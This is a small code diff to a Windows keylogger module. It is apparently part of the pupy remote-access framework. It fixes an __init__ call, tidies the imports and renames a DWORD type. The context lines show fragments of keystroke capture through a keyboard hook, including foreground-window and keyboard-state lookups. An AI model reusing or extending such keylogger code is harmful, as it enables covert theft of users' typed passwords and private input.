@@ -14,8 +14,10 @@
 # --------------------------------------------------------------
 #coding: utf-8
 import sys
+
 from ctypes import *
 from ctypes.wintypes import *
+
 import threading
 import time
 import datetime
@@ -146,7 +148,7 @@ class KeyLogger(pupy.Task):
     results_type = unicode
 
     def __init__(self, *args, **kwargs):
-        super(KeyLogger, self).__init__()
+        super(KeyLogger, self).__init__(*args, **kwargs)
         self.hooked = None
         self.pointer = None
         self.last_windows = None
@@ -218,7 +220,7 @@ class KeyLogger(pupy.Task):
         elif kbdllhookstruct.vkCode == VK_RETURN:
             specialKey = '[RETURN]'
 
-        pid = wintypes.DWORD()
+        pid = DWORD()
         tid = GetWindowThreadProcessId(GetForegroundWindow(), byref(pid))
         hKl = GetKeyboardLayout(tid)
         GetKeyboardState(byref(keyState))
